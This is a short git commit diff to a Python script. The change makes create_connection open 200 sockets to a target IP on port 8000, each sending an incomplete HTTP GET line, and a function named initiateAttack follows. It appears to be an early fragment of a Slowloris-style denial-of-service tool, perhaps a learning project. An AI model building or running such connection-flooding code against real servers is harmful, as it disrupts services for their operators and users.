616b11f4ebe8808c32b7ffbe1beaa7d0ad6b77aa
Deena Thomas <deenathomas@Seans-iMac.fios-router.home>
2021-05-19 16:46:20 -0400

    able to make 200 sockets each with a get request

--- script.py
+++ script.py
@@ -5,9 +5,10 @@ PORT = 8000
 STANDARD_GET_REQUEST = "GET / HTTP/1.1"
 
 def create_connection(ip):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, PORT))
-    s.send(str.encode(STANDARD_GET_REQUEST))
+    for _ in range(200):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, PORT))
+        s.send(str.encode(STANDARD_GET_REQUEST))
 
 
 def initiateAttack(ip):
